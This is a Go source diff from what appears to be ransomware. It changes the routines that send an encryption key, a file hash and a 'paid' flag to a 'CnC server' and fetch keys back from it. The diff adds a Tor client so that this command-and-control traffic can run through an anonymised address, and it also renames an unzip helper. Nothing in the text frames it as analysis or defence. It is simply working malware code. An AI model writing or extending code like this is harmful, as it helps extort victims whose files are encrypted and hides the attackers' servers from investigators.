@@ -13,9 +13,11 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/cretz/bine/tor"
 )
 
-const host string = "http://localhost:3000/api/"
+var host string = "http://localhost:3000/api/"
 
 func FindStringIndex(strArr []string, target string) int {
 	c := len(strArr)
@@ -42,9 +44,26 @@ func GetDesktopLocation() string {
 	return filepath.Join(home, "Desktop")
 }
 
+func createHttpClient() (*http.Client, *tor.Tor) {
+	//var client *http.Client = http.DefaultClient
+	if len(Settings.TorAddress) > 0 {
+		tor, c, err := SetupTor(nil)
+		host = Settings.TorAddress + "/api/"
+		if err != nil {
+			log.Fatal(err)
+		}
+		return c, tor
+	}
+	return http.DefaultClient, nil
+}
+
 func SendOffKey(hexKey string, hash string, paid bool, OfflineMode bool) (bool, error) {
 	if OfflineMode {
 		return false, errors.New("failed to contact CnC server")
+	}
+	client, tor := createHttpClient()
+	if tor != nil {
+		defer tor.Close()
 	}
 	jsonBody, err := json.Marshal(KeySendoffStruct{
 		Key:  hexKey,
@@ -54,7 +73,7 @@ func SendOffKey(hexKey string, hash string, paid bool, OfflineMode bool) (bool, 
 	if err != nil {
 		return false, err
 	}
-	resp, err := http.Post(host+"v2", "application/json", bytes.NewBuffer(jsonBody))
+	resp, err := client.Post(host+"v2", "application/json", bytes.NewBuffer(jsonBody))
 	if err != nil {
 		return false, err
 	}
@@ -68,7 +87,11 @@ func RetriveKeyByHash(hash string, OfflineMode bool) (string, error) {
 	if OfflineMode {
 		return "", errors.New("failed to contact CnC server")
 	}
-	resp, err := http.Get(host + "v2/" + hash)
+	client, tor := createHttpClient()
+	if tor != nil {
+		defer tor.Close()
+	}
+	resp, err := client.Get(host + "v2/" + hash)
 	if err != nil || resp.StatusCode != 200 {
 		return "", errors.New("failed to contact CnC server")
 	}
@@ -118,7 +141,7 @@ func ObtainKey(hash string) ([]byte, error) {
 	return body, err
 }
 
-func unzip(src []byte, dest string) ([]string, error) {
+func Unzip(src []byte, dest string) ([]string, error) {
 	var filenames []string
 
 	// r, err := zip.OpenReader(src)
